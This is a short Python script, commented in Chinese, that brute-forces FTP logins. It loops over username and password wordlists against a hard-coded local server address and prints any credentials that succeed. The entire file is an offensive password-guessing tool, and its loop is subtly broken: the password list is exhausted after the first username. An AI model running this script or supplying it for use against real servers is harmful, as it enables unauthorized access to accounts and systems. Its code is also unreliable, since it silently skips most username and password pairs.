import ftplib
FTPServer="192.168.1.105"#FTP服务器
UserDic="name.txt"
PasswordDic="pass.txt"
def  Login(FTPServer, userName, passwords):#登录模块
    try:
        f = ftplib.FTP(FTPServer)
        f.connect(FTPServer, 21, timeout = 10)#21端口
        f.login(userName, passwords)
        f.quit()
        print ("The userName is %s and password is %s" %(userName,passwords))
    except ftplib.all_errors:
        pass
userNameFile= open(UserDic,"r")
passWordsFile = open(PasswordDic,"r")
for user in userNameFile.readlines():#穷举用户名和密码
     for passwd in passWordsFile.readlines():
            un = user.strip('\n')
            pw = passwd.strip('\n')
            Login(FTPServer, un, pw)